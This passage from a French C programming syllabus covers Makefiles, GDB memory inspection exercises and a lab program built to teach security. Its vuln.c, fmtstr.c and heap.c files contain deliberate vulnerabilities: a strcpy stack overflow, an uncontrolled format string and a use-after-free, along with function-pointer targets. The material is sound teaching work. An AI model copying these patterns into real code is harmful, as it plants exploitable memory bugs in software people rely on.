<pre><code>lib/libmath.a: $(OBJDIR)/mathlib.o
    mkdir -p lib
    ar rcs $@ $&lt;</code></pre>
                            <p>Ce code crée une biblio statique (<span class="em">.a</span>), <span class="em">lib/libmath.a</span>, qui contient <span class="em">mathlib.o</span> et qui utilise <span class="em">ar</span> pour créer l'archive.</p>
                            <p><span class="em">$@</span> représente le fichier à construire, c'est-à-dire la cible de la règle. Ici, <span class="em">$@ = lib/libmath.a</span>.</p>
                            <p><span class="em">$&lt;</span> représente la première dépendance après le deux-points, c'est-à-dire le premier fichier listé dans les dépendances. Ici, <span class="em">$&lt; = obj/mathlib.o</span>.</p>
                            <p><span class="em">$^</span> représente toutes les dépendances (sans duplicata).</p>
                            <p><span class="em">$+</span> représente toutes les dépendances (avec duplicata).</p>
                            <p><span class="em">$?</span> représente les dépendances plus récentes que la cible.</p>
<pre><code>lib/libmath.so: $(SRC)/mathlib.c
    mkdir -p lib
    $(CC) -shared -fPIC -o $@ $&lt;</code></pre>
                            <p>Ce code crée compile directement mathlib.c (pas libmath.o, mais possible) et produit une bibliothèque partagée <span class="em">libmath.so</span>.</p>
<pre><code>clean:
    rm -rf obj bin lib</code></pre>
                            <p>Ce code supprime tout ce qui a été généré.</p>
                            <p>On peut installer ollydbg avec la commande suivante :</p>
<pre><code>sudo apt install ollydbg</code></pre>
                            <p>Pour mettre à jor MSYS2 avant d'installer des paquets :</p>
<pre><code>pacman -Syu</code></pre>
                            <p>Fermer le terminal et dans le nouveau terminal :</p>
<pre><code>pacman -u</code></pre>
                            <p>Pour installer GCC dans MSYS2 :</p>
<pre><code>pacman -S mingw-w64-x86_64-gcc</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">util.h</span>` est :</p>
<pre><code>#ifndef UTIL_H
#define UTIL_H

void print_banner(void);

#endif</code></pre>
                            <p>Le fichier `<span class="em">util.c</span>` est :</p>
<pre><code>#include "util.h"
#include &lt;stdio.h&gt;

void print_banner(void) {
    puts("=== Labo C : compilation & sécurité ===");
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">mathlib.h</span>` est :</p>
<pre><code>#ifndef MATHLIB_H
#define MATHLIB_H

int add(int a, int b);
int secret(void);

#endif</code></pre>
                            <p>Le fichier `<span class="em">mathlib.c</span>` est :</p>
<pre><code>#include "mathlib.h"
#include &lt;stdio.h&gt;

int add(int a, int b) {
    return a + b;
}

int secret(void) {
    puts("You reached secret()");
    return 42;
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">vuln.h</span>` est :</p>
<pre><code>#ifndef VULN_H
#define VULN_H

void vuln_input(char *s);
void call_funcptr(void);

#endif</code></pre>
                            <p>Le fichier `<span class="em">vuln.c</span>` est :</p>
<pre><code>#include "vuln.h"
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void secret_admin() {
    puts("Secret admin function: privileged action!");
}

void (*global_fp)() = NULL;

void vuln_input(char *s) {
    char buf[64];
    strcpy(buf, s);  // vulnérabilité volontaire
    printf("You entered: %s\n", buf);
}

void call_funcptr(void) {
    if (global_fp) {
        puts("Calling function pointer global_fp()");
        global_fp();
    } else {
        puts("global_fp is NULL");
    }
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">fmtstr.c</span>` est :</p>
<pre><code>#include &lt;stdio.h&gt;

void fmt_demo(char *user) {
    char buf[128];
    snprintf(buf, sizeof(buf), user);  // vuln format string volontaire
    printf("formatted: %s\n", buf);
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">heap.c</span>` est :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

void heap_demo(const char *input) {
    char *p = malloc(64);
    if (!p) return;
    strcpy(p, "initial");
    printf("Before free: %s\n", p);
    free(p);

    // Use-after-free volontaire
    printf("After free (UAF): %s\n", p);

    if (input) {
        char *q = malloc(64);
        if (!q) return;
        strcpy(q, input);
        printf("New chunk content: %s\n", q);
        free(q);
    }
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">main.c</span>` est :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#include "util.h"
#include "mathlib.h"
#include "vuln.h"

void heap_demo(const char *input);
void fmt_demo(char *user);

int main(int argc, char **argv) {
    print_banner();
    printf("add(2,3) = %d\n", add(2,3));
    printf("secret() addr maybe: %p\n", (void*)secret);

    if (argc &gt;= 2) {
        if (!strcmp(argv[1], "vuln") &amp;&amp; argc &gt;= 3) {
            vuln_input(argv[2]);
        }
        else if (!strcmp(argv[1], "callfp")) {
            call_funcptr();
        }
        else if (!strcmp(argv[1], "heap") &amp;&amp; argc &gt;= 3) {
            heap_demo(argv[2]);
        }
        else if (!strcmp(argv[1], "fmt") &amp;&amp; argc &gt;= 3) {
            fmt_demo(argv[2]);
        }
        else {
            printf("Usage: %s [vuln &lt;str&gt; | callfp | heap &lt;str&gt; | fmt &lt;fmt&gt;]\n", argv[0]);
        }
    } else {
        printf("No action specified. Try: vuln, callfp, heap, fmt\n");
    }

    return 0;
}</code></pre>
                        </li>
                    </ol>
                </article>
                <article>
                    <h2 id="memlab">Labo memlab :</h2>
                    <p>Ce que ce combo permet d'apprendre :</p>
                    <ol>
                        <li>
                            <p>Structure mémoire d'un processus</p>
                        </li>
                        <li>
                            <p>Stack vs Heap vs .data vs .rodata</p>
                        </li>
                        <li>
                            <p>Inspecter les adresses avec GDB</p>
                        </li>
                        <li>
                            <p>Lire/écrire dans la mémoire (sans exploitation)</p>
                        </li>
                        <li>
                            <p>VIsualiser plusieurs variables dans des régions différentes</p>
                        </li>
                        <li>
                            <p>Comprendre comment le programme est chargé en mémoire</p>
                        </li>
                    </ol>
                    <ol>
                        <li>
                            <h3>Code C simple : memlab.c :</h3>
                            <p>Copier-collez ce fichier tel quel.</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int global_var = 123;          // Stockée dans .data
const int const_global = 999;  // Stockée dans .rodata

void show_addresses() {
    int local_var = 42;        // Stack
    int *heap_var = malloc(sizeof(int));
    *heap_var = 777;           // Heap

    static int static_var = 555; // .data

    printf("=== Memory Regions ===\n");
    printf("Address of global_var     : %p\n", (void*)&amp;global_var);
    printf("Address of const_global   : %p\n", (void*)&amp;const_global);
    printf("Address of static_var     : %p\n", (void*)&amp;static_var);
    printf("Address of local_var      : %p\n", (void*)&amp;local_var);
    printf("Address of heap_var (ptr) : %p\n", (void*)&amp;heap_var);
    printf("Address of *heap_var      : %p\n", (void*)heap_var);

    printf("\nValues:\n");
    printf("global_var = %d\n", global_var);
    printf("local_var  = %d\n", local_var);
    printf("*heap_var  = %d\n", *heap_var);

    printf("\nEnter something to stop program (PID inspectable)...\n");
    getchar();

    free(heap_var);
}

int main() {
    show_addresses();
    return 0;
}</code></pre>
                        </li>
                        <li>
                            <h3>Compilation :</h3>
                            <p>Compiler en conservant les symboles :</p>
<pre><code>gcc -g -O0 memlab.c -o memlab</code></pre>
                        </li>
                        <li>
                            <h3>Lancer dans GDB :</h3>
<pre><code>gdb ./memlab</code></pre>
                            <p>Puis exécuter :</p>
<pre><code>break show_addresses</code></pre>
<pre><code>run</code></pre>
                        </li>
                        <li>
                            <h3>Inspecter les adresses :</h3>
                            <p>Quand l'exécution s'arrête dans <span class="em">show_addresses</span>, on peut inspecter les variables :</p>
                            <ul>
                                <li>
                                    <p>Lister les variables locales :</p>
<pre><code>info locals</code></pre>
                                </li>
                                <li>
                                    <p>Voir leur adresse :</p>
<pre><code>p &amp;local_var</code></pre>
<pre><code>p &amp;heap_var</code></pre>
<pre><code>p heap_var</code></pre>
                                </li>
                                <li>
                                    <p>Voir la mémoire brute :</p>
<pre><code>x/20x &amp;local_var</code></pre>
                                </li>
                                <li>
                                    <p>Voir la mémoire du heap :</p>
<pre><code>x/10x heap_var</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Modifier la mémoire (en toute sécurité) :</p>
                            <ul>
                                <li>
                                    <p>Modifier la valeur de <span class="em">local_var</span> :</p>
<pre><code>set variable local_var = 999</code></pre>
                                </li>
                                <li>
                                    <p>Modifier la valeur dans le heap :</p>
<pre><code>set {int}heap_var = 5555</code></pre>
                                </li>
                                <li>
                                    <p>Modifier un octet en mémoire :</p>
<pre><code>set {char}heap_var = 0x41</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h3>Voir les sections mémoire :</h3>
                            <p>Pour comprendre où se trouvent les variables :</p>
<pre><code>info proc mappings</code></pre>
                            <p>Ou en Windows :</p>
<pre><code>maintenance info sections</code></pre>
                        </li>
                        <li>
                            <h3>Trouver l'emplacement exact des segments :</h3>
                            <p>Tu peux afficher les valeurs imprimées par le programme :</p>
<pre><code>continue</code></pre>
                            <p>Puis quand il s'arrête au <span class="em">getchar()</span>, GDB reste ataché.</p>
                        </li>
                        <li>
                            <h3>Exercices pédagogiques (sécurisés) :</h3>
                            <ul>
                                <li>
                                    <h4>Exercice 1 :</h4>
                                    <p>Trouver l'adresse du <span class="em">global_var</span> dans GDB et vérifier avec <span class="em">printf</span>.</p>
<pre><code>p &amp;global_var</code></pre>
                                </li>
                                <li>
                                    <h4>Exercice 2 :</h4>
                                    <p>Afficher 16 octets autour de la variable locale.</p>
<pre><code>x/16x &amp;local_var</code></pre>
                                </li>
                                <li>
                                    <h4>Exercice 3 :</h4>
                                    <p>Modifier la valeur de <span class="em">*heap_var</span></p>
<pre><code>set {int} heap_var = 5555</code></pre>
                                    <p>Ensuite, continuer l'exécution :</p>
<pre><code>continue</code></pre>
                                </li>
                                <li>
                                    <h4>Exercice 4 :</h4>
                                    <p>Afficher les sections (stack, heap, .data, .text) et identifier chaque variable.</p>
<pre><code>info proc mappings</code></pre>
                                    <p>Ou sur Windows :</p>
<pre><code>maintenance info sections</code></pre>
                                </li>
                                <li>
                                    <h4>Exercice 5 :</h4>
                                    <p>Trouver l'adresse de la fonction <span class="em">show_addresses</span> :</p>
<pre><code>p show_addresses</code></pre>
                                    <p>Et afficher quelques instructions :</p>
<pre><code>disas show_addresses</code></pre>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <h3>Commandes GDB utiles (cheat-sheet) :</h3>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>Commande</th>
                                <th>Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>break &lt;func&gt;</td>
                                <td>breakpoint à la fonction</td>
                            </tr>
                            <tr>
                                <td>break *0x401234</td>
                                <td>breakpoint addr</td>
                            </tr>
                            <tr>
                                <td>run [args]</td>
                                <td></td>
                            </tr>
                            <tr>
                                <td>start</td>
                                <td>démarre le programme et stoppe à la fn main</td>
                            </tr>
                            <tr>
                                <td>next / step</td>
                                <td>step over/ into (exécution pas à pas)</td>
                            </tr>
                            <tr>
                                <td>finish</td>
                                <td>run until current function returns</td>
                            </tr>
                            <tr>
                                <td>info functions</td>
                                <td>lister les fonctions</td>
                            </tr>
                            <tr>
                                <td>info address secret</td>
                                <td>adresse d'une fonction</td>
                            </tr>
                            <tr>
                                <td>p &amp;var</td>
                                <td>print adresse d'une var</td>
                            </tr>
                            <tr>
                                <td>p/x var</td>
                                <td>afficher var en hex</td>
                            </tr>
                            <tr>
                                <td>x/x &lt;addr&gt;</td>
                                <td>examiner mémoire (hex)</td>
                            </tr>
                            <tr>
                                <td>disassemble &lt;func&gt;</td>
                                <td></td>
                            </tr>
                            <tr>
                                <td>layout asm</td>
                                <td>mode TUI asm</td>
                            </tr>
                            <tr>
                                <td>info frame</td>
                                <td></td>
                            </tr>
                            <tr>
                                <td>backtrace</td>
                                <td></td>
                            </tr>
                            <tr>
                                <td>set pagination off</td>
                                <td></td>
                            </tr>
                        </tbody>
                    </table>
                </article>
            <!-- fin de section -->
            </section>
        </main>
        <footer role="contentinfo">
            <div>
                <address>
                    Professeurs :
                    <a class="mail" href="mailto:olivier.choquet@vinci.be">Choquet Olivier</a>
                    <a class="mail" href="mailto:driss.vandenheede.techinfo@gmail.com">Vandenheede Driss</a>
                </address>
            </div>
            <div>
                <p>Si vous détectez une erreur, une faute d'orthographe, n'hésitez pas à envoyer un mail aux adresses juste à côté avec le nom de la page et l'erreur détectée.</p>
            </div>
            <div id="version">
                <p>Syllabus HTML</p>
                <p>Version 5.0</p>
            </div>
        </footer>
        <script src="../pre.js"></script>
    </body>
</html>